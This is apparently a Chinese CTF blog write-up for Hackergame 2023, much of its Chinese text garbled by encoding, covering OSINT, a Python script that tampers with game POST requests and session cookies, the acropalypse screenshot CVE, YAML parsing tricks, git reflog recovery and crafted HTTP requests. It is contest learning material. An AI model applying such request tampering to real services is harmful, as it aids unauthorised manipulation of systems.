---
title: Hackergame 2023 Writeup
date: 2023-11-05 17:19:00
updated: 2023-11-07 20:19:00
tags: 
categories:
keywords:
description:
  ç©æ±æ´»åŠ¨è®°å½• 2023 Ver.
top_img:
comments:
cover:
toc:
toc_number:
toc_style_simple:
copyright:
copyright_author:
copyright_author_href:
copyright_url:
copyright_info:
mathjax:
katex:
aplayer:
highlight_shrink:
aside:
sticky:
---

## ç©æ±æ´»åŠ¨è®°å½• 2023 Ver. 

æ©ï¼Œæ€»ä¹‹è¿˜æ˜¯æµ‘æµ‘å™©å™©åœ°ç†¬åˆ°ç°åœ¨äº†ã€‚[å»å¹´ wp çš„ epilogue][hg2022-wp-epilogue]

ä¸€è§‰ç¡é†’å·²ç»æ˜¯ 28 å·ä¸‹åˆï¼Œå°±æ²¡å•¥ä¸€è¡€èƒ½æŠ¢äº†å“ˆå“ˆã€‚

ä»¥ä¸‹å†…å®¹å¤§è‡´ä¸Šæ˜¯å’±çš„ç©æ±æ´»åŠ¨è®°å½•



---

## ç©å††ç¥ç©çš„ï¼ˆç­¾åˆ°ï¼‰ 

è¿™ç§ä¸€èˆ¬éƒ½æ˜¯æ”¹æ”¹ URL çš„å°æŠŠæˆã€‚

<!--ä½†å¥½åƒç›´æ¥æ”¹ similarity å°±æäº¤ä¼šè¢«æ‰“å›æ¥ï¼Œå°±æ€¥äº†ï¼Œå¯¹ç€ js ä¸€é¡¿æ”¹ä¹Ÿæ”¹ä¸å‡ºæ‰€ä»¥ã€‚-->

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/01-4.png)

ï¼ˆä¼¼ä¹è¦å…ˆå½•åˆ¶ä¸€éæäº¤ä¸Šå»ï¼Ÿï¼‰ç»“å°¾åŠ å‚æ•° `?similarity=99.99999` å°±è¡Œ

è¿™...å¤ªåŸäº†ï¼Œä¸æ„§æ˜¯ www.ç©åŸç¥ç©çš„.com

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/01-3.png)



---

## çŒ«å’ªé—®ç­”

~~æ„Ÿè§‰ä»Šå¹´çš„å…¨éƒ¨éš¾åº¦éƒ½é›†ä¸­åˆ°ç¬¬ä¸€é—®äº†~~

1. åšå®Œåä¸‰é“å¼€å§‹æšä¸¾ï¼ˆ~~æ„Ÿè§‰è¿˜æŒºæ–‡æ˜çš„ï¼Œæ¯æ¬¡æäº¤ä»¥åä¼šä¿ç•™å·²ç»å¡«å¥½çš„ç­”æ¡ˆ~~ï¼‰ï¼Œéè´Ÿæ•´æ•°å°±ä» 1 å¼€å§‹ï¼Œåšåˆ° 4 å‘ç°ä¸å¤ªå¯¹åŠ²ï¼Œæœä¸€ä¸‹å±…ç„¶è¿˜æœ‰å®˜ç½‘çš„

   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/02-1-1.png)
   
   ç‚¹è¿›å»ä¸€çœ‹ï¼ŒåŸæ¥æœ‰åå‡ å±‚å•Šï¼Œæ²¡äº‹äº†ï¼ˆ
   
   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/02-1-2.png)
   
   **12**ï¼Œå…¨éƒ¨ç­”å¯¹ï¼Œåˆ†æ•°åˆ°æ‰‹ï¼ˆ

2. æœç´¢ "chicken density in observable universe upper limit" å±…ç„¶è‡ªåŠ¨è¡¥å…¨è®ºæ–‡åå­—ï¼Œå¤ªæ£’äº†ã€‚

   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/02-2-1.png)

   æ‰“å¼€ [è®ºæ–‡](https://arxiv.org/pdf/2303.17626.pdf) ï¼Œå°±èƒ½åœ¨å€’æ•°ç¬¬äºŒé¡µçœ‹åˆ°ç»“è®ºï¼Œå¡«ä¸€ä¸ª **23** è¿›å»ï¼Œå¾—åˆ†ï¼ˆ

   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/02-2-2.png)

3. æœç´¢ "compile TCP BBR" å‡ºç°äº†è¿™ä¸ªï¼šhttps://github.com/google/bbr/blob/master/Documentation/bbr-quick-start.md æœ€åæåˆ°ä¸€ä¸ª **`CONFIG_TCP_CONG_BBR`** å¡«è¿›å»å°±è’™å¯¹äº†ã€‚

4. æœç´¢ "python mypy dead loop" å‡ºç°ä¸€ç¯‡è®ºæ–‡ï¼š[*Python Type Hints Are Turing Complete*](https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf)ï¼Œç‚¹è¿›å»çœ‹åˆ° supplement material æåˆ° **ECOOP**ï¼Œå¡«å…¥ï¼Œå¾—åˆ†ã€‚




## Deepâ™‚er & darkâ™‚er

[æ˜¯ä¸æ˜¯æ¯å¹´éƒ½æœ‰é“¶æ¢¦æ¢—å•Š](https://blog.h3a.moe/src/EX00007/#%E9%BB%91%E8%89%B2%E9%AB%98%E7%BA%A7%E8%87%AA%E5%8A%A8%E6%9C%BA%EF%BC%88Flag-%E8%87%AA%E5%8A%A8%E6%9C%BA%EF%BC%89)ï¼Œç«¯å£å·æ€ä¹ˆæ˜¯ 11451ï¼ˆ

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/03-1.png)

ä½†æ˜¯å‘¢å°±ç®—ä¸€ç›´æŒ‰ç€ pgdown ä¹Ÿä¸æ˜¯ä¸ªå¤´ï¼Œå°±æƒ³å»çœ‹çœ‹æœ‰æ²¡æœ‰å“ªé‡Œéª— flag çš„ï¼Œç»“æœç»™åœ¨ main.js é‡Œé¢ç¢°ä¸Šäº†ï¼š

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/03-2.png)

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/03-3.png)

é‚£åœ¨ console é‡Œé¢<!--äº²è‡ª-->æ‰§è¡Œä¸€éå°±å¯ä»¥äº†ï¼š

```javascript
hash = CryptoJS.SHA256(`dEEper_@nd_d@rKer_${localStorage.token}`).toString();
flag = `flag{T1t@n_${hash.slice(0, 32)}}`
```

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/03-4.png)



---

## æµ‹ä¸äº†é€Ÿäº†ï¼ˆæ—…è¡Œç…§ç‰‡ï¼‰

**åˆ«çš„éƒ½å¯ä»¥åšä¸å‡ºæ¥ï¼ŒOSINT æˆ‘å†³ä¸å…è®¸è‡ªå·±åšä¸å‡ºæ¥ï¼**

é¢˜é¢çš„ç…§ç‰‡é‡Œéšçº¦æœ‰å»å¹´é¢˜ç›®é‡Œçš„ ZOZO stadiumï¼Œæˆ‘æ²¡æœ‰å»æ±‚è¯ï¼Œæ²¡æƒ³åˆ°å®˜æ–¹ wp è‡ªå·±æåˆ°äº†ã€‚

ä¸‹äº†äº”å¼ å›¾ï¼Œç»“æœéƒ½æŠŠ exif ä¿¡æ¯ç»™åˆ äº†ï¼Œæµ‹ä¸äº†é€Ÿäº†ï¼ˆ

å®é™…åšå‡ºçš„é¡ºåºå¤§æ¦‚æ˜¯ (1,2) (5,6) (3,4)

ä¸­é—´è¿™ä¸ªæ´»åŠ¨çœŸç»™æˆ‘éš¾ä½äº†

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/04-0.png)

1. ç¬¬ä¸€ä¸ªæ—¥æœŸå°±ç»™æˆ‘éš¾ä½äº†ã€‚æ˜¯ä»ç¬¬ 6 é¢˜çš„æµ·æŠ¥ä¸­æ‰¾åˆ°å¤§è‡´æ—¥æœŸèŒƒå›´æ˜¯ 2023-08-03 åˆ° 2023-08-13ï¼Œç„¶åçè’™äº†ä¸€ä¸ª **10** ç»“æœå¯¹äº†ã€‚åé¢æ³¨æ„åˆ°å­¦é•¿è„–å­ä¸Šçš„ STATPHYS28ï¼Œæ˜¯åœ¨ 08-07 åˆ° 08-11ï¼Œæ›´æ¥è¿‘ã€‚**æœ€ååšåˆ°ç¬¬äº”é¢˜æ‰å‘ç° 10 å·æ™šä¸Šæ‰æœ‰èšé¤ï¼Œç¬‘æ­»ã€‚**

2. Google è¯†å›¾å‘ç°å¥–ç‰Œæ˜¯è¯ºè´å°”å¥–ï¼ˆæˆ‘çš„å¤©ï¼Œç‰›å•Šï¼‰ï¼Œç„¶åæœä¸€ä¸‹ "M. Koshiba MMII" å‘ç°æ˜¯åœ¨ 2002 å¹´å¾—åˆ°ç‰©ç†å­¦å¥–çš„å°æŸ´æ˜Œä¿Šï¼Œ1926 å¹´ç”Ÿäººã€‚éšåæœ "Tokyo university nobel prize exhibit" å‘ç° [ä¸œå¤§çš„ä¸€ä¸ªç½‘é¡µ](https://www.s.u-tokyo.ac.jp/en/gallery/nobelprize/) ï¼Œç‚¹è¿›å»çœ‹åˆ°ä¸‰ä¸ªäººï¼Œå‰©ä¸‹ä¸¤ä¸ªæ˜¯çœŸé‹æ·‘éƒï¼ˆ1931ï¼‰å’Œæ¢¶ç”°éš†ç« ï¼ˆ1959ï¼‰ï¼Œæ¢¶ç”°çš„ç½‘é¡µ [URL](https://www.icrr.u-tokyo.ac.jp/prwps/commemorative/nobel/description.html) ä¸€çœ‹å°±æ˜¯ **ICRR** çš„ï¼Œä»–çš„ [Wikipedia](https://en.wikipedia.org/wiki/Takaaki_Kajita) é¡µé¢ä¹Ÿè¯å®äº†è¿™ä¸€ç‚¹ã€‚

3. æœ ueno museum with a fountain in front of it ä»å„ç§ç…§ç‰‡åˆ¤æ–­æ˜¯æ±äº¬å›½ç«‹åšç‰©é¤¨ã€‚å­¦é•¿è„–å­ä¸Šçš„ STATPHYS28 æ˜¯åœ¨ä¸œå¤§æœ¬ä¹¡æ ¡åŒºã€‚ä½ç½®æ¥è¿‘ã€‚**é‡æ–°æœå›¾å‘ç°æ˜¯ä¸Šé‡å…¬å›­ï¼ˆueno parkï¼‰çš„æ´»åŠ¨ã€‚**ç»ç”±æ ‡å¿—æ€§çš„ä¸ƒåº§å–·æ³‰ï¼Œåœ¨å«æ˜Ÿå›¾ä¸Šç¡®è®¤äº†ä¸€éã€‚

   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/04-3-1.jpg)

   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/04-3-2.jpg)

   æ•°åº¦æœç´¢éƒ½ä¸é¡ºåˆ©ï¼Œä½¿ç”¨ `"ä¸Šé‡å…¬åœ’" 2023/8/10` æœç´¢ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªå«åšâ€œå…¨å›½æ¢…é…’ã¾ã¤ã‚Šinæ±äº¬2023â€çš„æ´»åŠ¨ã€‚ç‚¹è¿›å»ä¸€çœ‹æ—¶é—´ï¼Œå®Œå…¨ä¸€è‡´ã€‚

   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/04-3-3.jpg)

   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/04-3-4.jpg)

   ç»ˆäºçœ‹åˆ°äº† staff å‹Ÿé›†çš„ç½‘é¡µï¼Œä»£ç  **S495584522**

   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/04-3-5.jpg)

   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/04-3-6.jpg)

4. ä¸ç†è§£ï¼Œè¯•äº† 1000 å’Œ 500 éƒ½ä¸å¯¹ï¼Œ**ç»“æœ 0 å¯¹äº†**ã€‚

   ~~è¿˜èƒ½å¸¦å­¦å¼Ÿç©è¯æ˜æ²¡æ®‹ çœ‹ç€ä¹Ÿä¸è€ é‚£åªèƒ½æ˜¯æœªæˆå¹´äº†~~

   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/04-4.png)

5. ä» STATPHYS28 æ—¥ç¨‹æ¥çœ‹æ˜¯ 10 å·æ™šä¸Šä¸¾è¡Œ [èšé¤](https://statphys28.org/banquet.html) ã€‚ç„¶åå¾€ä¸‹åˆ’çœ‹åˆ°äº† meeting pointï¼Œè¿™ä¸å°±æ˜¯å½“å¹´ä¸œå¤§å…¨å…±é—˜å é¢†çš„**å®‰ç”°è¬›å ‚**ï¼Ÿæƒ³å¿µä¸‰å²›å…ˆç”Ÿã€‚

   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/04-5.png)

6. æœç´¢â€œJR ä¸Šé‡ ãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹â€æ‰¾åˆ°äº†é‚£å¼ æµ·æŠ¥ï¼Œæ˜¯ï¼ˆå¤§ï¼‰**ç†ŠçŒ«**

   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/04-6-1.jpg)

   è¯†å›¾åˆ¤æ–­å‡ºç«™ä½ç½®æ˜¯ Shibuya

   ~~è¿™ç…§ç‰‡æ‹å¾—å°±åƒåœ¨æ¸¸æˆé‡Œçš„æˆªå›¾ä¸€æ ·ï¼Œæˆ‘å·®ç‚¹ä»¥ä¸ºè¿™äººæ˜¯å›é…’åº—ç© Minecraft äº†~~

   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/04-6-2.jpg)

   ç„¶å Google çš„è‡ªåŠ¨è¡¥å…¨æ°¸è¿œä¸ä¼šè®©ä½ å¤±æœ›ï¼š**ç§‹ç”°çŠ¬**

   ![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/04-6-3.jpg)

   

---

## æˆ‘è„‘å­æœ‰ç—…ï¼ˆèµ›åšäº•å­—æ£‹ï¼‰

çœ‹èµ·æ¥å‰ç«¯åšä¸äº†ä»€ä¹ˆï¼Œæ²¡æœ‰ flagï¼Œæ•°æ®ä¸¢ç»™åç«¯å¤„ç†ã€‚

æŸ¥äº†ä¸‹ï¼Œäº•å­æ£‹å…ˆæ‰‹æœ‰ä¸è¾“çš„ä¸‹æ³•ã€‚å…ˆä¸‹åœ¨ä»»æ„è§’ï¼Œç„¶åå¯¹æ‰‹ä¸ä¸‹ä¸­é—´å°±å¿…èµ¢ã€‚å¦‚æœå¯¹æ‰‹ä¸‹ä¸­é—´å°±ä¸‹åœ¨å¯¹è§’ï¼Œè‡³å°‘ä¸è¾“ã€‚

ä¸‹äº†ä¸€æ•´å¤©å…¨æ˜¯å¹³æ‰‹ã€‚å°±ç›˜ç®—å¯èƒ½è¦å¯¹ POST è¡¨å•ä¸‹ç‚¹æ‰‹è„šã€‚**ä¸æ•¢æƒ³ï¼ŒçœŸå°±æ˜¯åƒæ£‹å­ã€‚**

ä½†æ˜¯è§‚å¯Ÿå‘ç° AI å¾ˆæœºçµï¼Œéƒ½æ˜¯ä¸‹ä¸­é—´ï¼Œé‚£æˆ‘å¯ä»¥è¯•è¯•æœ€ååƒæ‰ä¸­é—´çš„æ£‹å­ã€‚

æŒ‰ç…§æ£‹ç›˜åæ ‡å°±æ˜¯

```
[0][0] -> [2][2] -> [1][1]
```

æ¯æ¬¡çš„åŠ¨ä½œéƒ½æ˜¯é€šè¿‡ POST è¡¨å•å®Œæˆã€‚éœ€è¦ç”¨çš„åº”è¯¥åªæœ‰æ¸…é›¶ `'act': 'reset'` å’Œä¸‹å­ `{'x':a, 'y':b} // a,b is in {0,1,2}` ï¼Œç„¶ååç«¯æŠŠå®ƒä¸‹å‡ºæ¥çš„æ£‹ç›˜å‘è¿‡æ¥ã€‚

ç”¨ py ä¸¢ä¸‰ä¸ª POST ä¸Šå»åº”è¯¥å°±è¡Œã€‚

ä»Šå¹´æ¢äº†é‰´æƒæ–¹å¼ï¼Œç›´æ¥ `?token=` å·²ç»ä¸èƒ½ç”¨äº†ï¼Œåªèƒ½å¼€ä¸ªç½‘é¡µç„¶åå€Ÿ Cookie æ¥ç”¨ï¼Œä½†æ˜¯è¢«å¥‡è‘©çš„ `Set-Cookie` æŠ˜è…¾äº†ä¸€ä¸‹åˆï¼Œä¸å¤„ç†å°±ä¸€ç›´æ˜¯é‡å¼€ä¸€å±€ï¼Œä¿ä¸ä½æ£‹å±€çš„çŠ¶æ€ã€‚`requests.Session` å±…ç„¶åœ¨è‡ªå·±è®¾ç½® Cookie ä»¥åå°±ä¸å¤„ç† `Set-Cookie` äº†ï¼Œæˆ‘è¿˜è¦è‡ªå·±å¤„ç† response header å‘æ¥çš„æ–° Cookie. <!--æ­¤å¤„å‹å¥½é—®å€™ python-requests å¼€å‘è€…å’Œæœ¬é¢˜å‡ºé¢˜äººã€‚-->

```python
import requests
import logging
import http.client as http_client
import re

http_client.HTTPConnection.debuglevel = 1

# You must initialize logging, otherwise you'll not see debug output.
logging.basicConfig()
logging.getLogger().setLevel(logging.DEBUG)
requests_log = logging.getLogger("requests")
requests_log.setLevel(logging.DEBUG)
requests_log.propagate = True


def getNextCookie(header):
    SetCookie = header['Set-Cookie']
    regexp = re.compile("session\=(.*)\;\ HttpOnly\; Path\=\/")
    nextCookie = re.findall(regexp, SetCookie)[0]
    return nextCookie


with requests.Session() as hgsession:
    hgheaders = {
        'Cookie': 'session=<YOUR_SESSION>'
    }

    r = hgsession.get(
        'http://202.38.93.111:10077/', 
        headers = hgheaders,
        )
    
    print(r.headers)
    # [0,0] -> [2,2] -> [1,1] 
    # so that the AI cannot win

    r = hgsession.post(
        'http://202.38.93.111:10077/',
        headers = hgheaders, 
        json = { 'act': 'reset' }
        # data = { 'x':0, 'y':0 }
        )
    nextCookie = getNextCookie(r.headers)
    # print(nextCookie)
    
    r = hgsession.post(
        'http://202.38.93.111:10077/',
        headers = {'Cookie': 'session=' + nextCookie}, 
        json = { 'x':0, 'y':0 }
        # data = { 'x':0, 'y':0 }
        )
    print(r.text)
    nextCookie = getNextCookie(r.headers)

    r = hgsession.post(
        'http://202.38.93.111:10077/',
        headers = {'Cookie': 'session=' + nextCookie}, 
        json = { 'x':2, 'y':2 }
        # data = { 'x':0, 'y':0 }
        )
    print(r.text)
    nextCookie = getNextCookie(r.headers)

    r = hgsession.post(
        'http://202.38.93.111:10077/',
        headers = {'Cookie': 'session=' + nextCookie}, 
        json = { 'x':1, 'y':1 }
        # data = { 'x':0, 'y':0 }
        )
    print(r.text)
    # nextCookie = getNextCookie(r.headers)

```

åæ¥å¬è¯´äº†ä¸­é—´äººæŠ“åŒ…éå¸¸ç®€å•ï¼Œä½†æˆ‘ä¸å¤ªæƒ³å¼„,æ˜¯æˆ‘å¤ªç¬¨äº†ã€‚

åšäº†ä¸€ä¸‹åˆï¼Œæˆ‘è„‘å­æœ‰ç—…ã€‚



---

## å‘æ¢¦æ—¶è®°å¾—å…³æœºï¼ˆå¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹ï¼‰

[ä¸€å †äººäº¤è¿‡äº†](https://www.aperisolve.com/878ded37c75d5fd949c5d4dfc0a6735f)ï¼Œçœ‹äº†ä¸‹æ˜¯æ–‡ä»¶ç»“å°¾çš„é—®é¢˜ï¼šåœ¨ IEND ä¹‹åè¿˜æœ‰ä¸€å¤§å †æ•°æ®ã€‚

å¯¹ç€äºŒè¿›åˆ¶å’Œ PNG ç»“æ„æŠ˜è…¾äº†å¾ˆä¹…ï¼Œä¹Ÿæ²¡èƒ½çœ‹å‡ºæ¥ä»€ä¹ˆï¼Œç›´åˆ°é‡çœ‹é¢˜é¢ï¼Œçªç„¶æ„è¯†åˆ°ä¹‹å‰å¤§å®¶éƒ½åœ¨è½¬å‘çš„ Google Pixel æˆªå›¾å·¥å…·å‡ºè¿‡ä¸€ä¸ª [CVE-2023-21036](https://cve.report/CVE-2023-21036)ï¼Œæˆ‘å½“æ—¶å·²ç»å‡ä¸Šå»å¾ˆä¹…äº†ï¼Œå°±æ²¡ç®¡è¿™ä¸ªäº‹æƒ…ï¼Œè¿™æ¬¡æƒ³èµ·æ¥å†å»æœæœçœ‹ã€‚

CVE åŸä½œè€…åˆ†äº«è¿‡[å¿ƒè·¯å†ç¨‹](https://www.da.vidbuchanan.co.uk/blog/exploiting-acropalypse.html)ï¼ˆ

å¥½å®¶ä¼™ï¼Œåœ¨çº¿ demo éƒ½æœ‰äº†ï¼š

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/06-1.png)

ä¸ç”±å¾—æƒ³åˆ°ä¹‹å‰é‚£ä¸ªç”¨ SIM å¡ PUK ç»•è¿‡é”å±çš„ [CVE-2022-20465](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-20465)ï¼Œå†æ¬¡å»ºè®®å„ä½åŠæ—¶æ›´æ–°ã€‚

åŒæ—¶ï¼Œè¯·æ—¶åˆ»ç‰¢è®°ï¼Œå±å¹•æˆªå›¾å¯èƒ½å«æœ‰é‡è¦çš„éšç§ä¿¡æ¯ï¼ŒåŠ¡å¿…å°å¿ƒè°¨æ…å¤„ç†ã€‚

å¦å¤–ï¼Œå¼•ç”¨æŸä½ IT ç•Œ HKer åœ¨é‚£å¹´çš„å¤§é›¨ä¸­å‘å‡ºçš„å¿ å‘Šï¼šå‘æ¢¦æ—¶è®°å¾—å…³æœºã€‚



---

## ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨

çœ‹äº†ä¸‹è¦å¤„ç†çš„å…ƒç´ é•¿è¿™æ ·ï¼š

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/07-1.png)

**å¤§æ¦‚æ„Ÿè§‰æ˜¯ç”¨ä¸ª userscript å»å¸®æˆ‘ click**ï¼Œä½†æˆ‘ä¸ä¼š js å•Šï¼Œé‚£å°±<!--äº²è‡ª-->æŒ‡æŒ¥ chatgpt å¸®æˆ‘å†™ï¼ˆ

prompt å¦‚ä¸‹ï¼š

> I need to write a js userscript to capture some content and perform a click for the specific element. How should I start it
> 
> the element I need to find looks like this: "<div  class="fakeqq-message__bubble"><div  class="fakeqq-message__bubble-arrow"></div><span>è¿™é“é¢˜ flag æ˜¯hack[vbzpobcbwyioysfz]</span></div>"
> 
> The condition to click is that the <span> element contains a  substring that starts with "hack", then a pair of square brackets with some chars in it.
> 
> well, the page scrolls very quickly. so I need to quickly find the newly added elements, how to do that?


å¤šæ¬¡è¿­ä»£åï¼Œæœ€ç»ˆå¾—åˆ°äº†å¦‚ä¸‹èƒ½ç”¨çš„å›å¤ï¼š


> To quickly find and interact with newly added elements on a page that scrolls quickly, you can use Mutation Observers. A Mutation Observer is a JavaScript API that allows you to watch for changes in the DOM (Document Object Model) and react to those changes in real-time. Here's how you can use a Mutation Observer to find and interact with newly added elements:
>
> ```javascript
> (function() {
>     // Function to check if a message is a "hack" message
>     function isHackMessage(messageText) {
>         return messageText && messageText.startsWith("è¿™é“é¢˜ flag æ˜¯hack[") && messageText.endsWith("]");
>     }
> 
>     // Function to process a single message
>     function processMessage(messageBubble) {
>         const messageText = messageBubble.querySelector('span');
>         if (isHackMessage(messageText.textContent.trim())) {
>             console.log('Captured content:', messageText.textContent.trim());
>             messageBubble.click();
>         }
>     }
>     
>     // Callback function for the Mutation Observer
>     function handleMutations(mutationsList, observer) {
>         for (const mutation of mutationsList) {
>             if (mutation.type === 'childList') {
>                 // New elements have been added
>                 for (const node of mutation.addedNodes) {
>                     if (node.nodeType === Node.ELEMENT_NODE) {
>                         const messageBubble = node.querySelector('.fakeqq-message__bubble');
>                         if (messageBubble) {
>                             processMessage(messageBubble);
>                         }
>                     }
>                 }
>             }
>         }
>     }
>     
>     // Set up a Mutation Observer to watch for changes in the DOM
>     const targetNode = document.body; // You can change the target node to be more specific
>     const config = { childList: true, subtree: true };
>     const observer = new MutationObserver(handleMutations);
>     observer.observe(targetNode, config);
> })();
> 
> ```
>
> In this code:
>
> - The `handleMutations` function is the callback for the Mutation Observer. It checks for added nodes and, if they are elements, it looks for the message bubble and processes it if it's a "hack" message.
> - The Mutation Observer watches for changes in the DOM, specifically child node additions (`childList: true`) and sub-tree mutations (`subtree: true`). You can adjust the `targetNode` to target a more specific part of the DOM if necessary.
>
> This code will monitor the DOM for any newly added elements with the class "fakeqq-message__bubble" and process them as they are added, making it suitable for pages with rapidly scrolling content.

å”‰ï¼Œå¤´ä¸€æ¬¡å¼„å‡ºä¸€ä¸ªèƒ½ç”¨çš„ç”¨æˆ·è„šæœ¬ï¼Œçœ‹å®ƒè‡ªåŠ¨æ’¤å›çœŸçš„å¥½çˆ½å•Šï¼ˆ



---

## è€ƒ A è¯ï¼Œæœ‰ A ç½©ï¼ˆè™«ï¼‰

æ˜¯ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶ï¼Œå¬ä¸€è€³æœµå°±çŸ¥é“æ˜¯ SSTV. é‚£å°±å¾ˆç®€å•äº†ï¼Œéšä¾¿ä¸¢ç»™ä¸€ä¸ª SSTV è§£ç å™¨æ”¾ä¸€éå°±å‡ºæ¥äº†ã€‚

*P.S. æ„Ÿè§‰è¿™å¼ å›¾æœ‰æ”¹é€ æˆæ¢—å›¾çš„æ½œåŠ›ï¼ˆï¼ˆ*

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/08-1.jpg)




---

## YAML å·¥ç¨‹å¸ˆï¼ˆJSON âŠ‚ YAML?ï¼‰

è¯» YAML1.1 æ ‡å‡†æ–‡æ¡£ä¸­çš„ JSON Schemaï¼Œæ³¨æ„åˆ°æœ‰ä¸ªåœ°æ–¹è§£æå‡ºæ¥çš„ä¸å¤ªä¸€æ ·ã€‚

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/09-1.png)

ç›´æ¥å€Ÿæ¥ç”¨ï¼Œå‡º flag1

```json
{"key1": Infinity}
```

æ¥ç€è¯»

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/09-2.png)

å†æ¥ä¸€éï¼Œå¾— flag2

```json
{"key1": Infinity, "key1": 1}
```



---


## çœŸæ˜¯ä¸ªé¥­æ¡¶å‘¢ ww~ï¼ˆGitï¼ŸGitï¼ï¼‰

è¯¶å‘€ï¼Œè¿™ä¸ªæˆ‘ç†Ÿã€‚~~å’±ä¹‹å‰å¯æ˜¯åŠ¨ä¸åŠ¨å°± reset ä¸€ä¸‹ï¼Œä¸è¦å¤ªç†Ÿç»ƒäº†~~

<!-- å› ä¸ºæ¢ gpg key æŠŠæ‰€æœ‰çš„ commit éƒ½é‡ç­¾è¿‡ï¼Œæ¯”èµ·é‚£ä¸ªè¿™éƒ½æ˜¯å°æ„æ€ã€‚ -->

ä½ çš„ç¡® reset äº†ï¼Œå¯æ˜¯ commit å¹¶æ²¡æœ‰æ¶ˆå¤±ï¼Œåªæ˜¯è„±ç¦»äº† commit graph è€Œå·²ã€‚

åªè¦ `git reflog` ä¸€ä¸‹å°±èƒ½çœ‹åˆ°ä¹‹å‰ reset æ‰çš„ commitï¼Œå¾ˆæ˜æ˜¾æ˜¯ä» `505e1a3` reset åˆ°äº† `15fd0a1`

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/10-1.png)

å¯¹æ¯”ä¸€ä¸‹ `git log` çœ‹åˆ°çš„

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/10-2.png)

é‚£å¤§æ¦‚å°±æ˜¯è¿™ä¸ªæ ·å­ï¼ˆmermaid é‡Œé¢çš„ gitGraph åªèƒ½ç”»æˆè¿™æ ·äº†ï¼Œ**å®é™…ä¸Š `505e1a3` æ˜¯æ²¡æœ‰ main- æŒ‡é’ˆçš„**ï¼Œè¯·è§è°…ï¼‰

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/10-3.png)

é‚£å°±å¾ˆç®€å•äº†ï¼Œç›´æ¥ `git checkout 505e1a3` å°±è¡Œï¼Œç„¶åçœ‹ä¸€ä¸‹ log çš„ä¿®æ”¹å°±çŸ¥é“å»å“ªæ‰¾ flag äº†ï¼ˆè¿™ä¸ª git user é…å¾—å¤ªç”³å¿…äº†

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/10-4.png)

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/10-5.png)

å“ˆå“ˆï¼Œåƒäº†é¥­æ¡¶é‡Œçš„åæ‚”è¯ï¼Œä¹Ÿæ˜¯ä¼šè¢«å‘ç°çš„ï¼ˆï¼ˆ



---

## HTTP é›†é‚®å†Œ

çœŸå¾—å¯¹ç€ MDN æ–‡æ¡£ä¸€ä¸ªä¸ªæŠ˜è…¾ï¼Œç»·ä¸ä½äº†

100 

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Expect: 100-continue\r\n
\r\n
```

304

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
If-None-Match: *\r\n
\r\n
```

414

è¿™ä¸ªå®³å¾—æˆ‘çš„ Firefox å´©æºƒä¸‰æ¬¡

```
GET /very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/res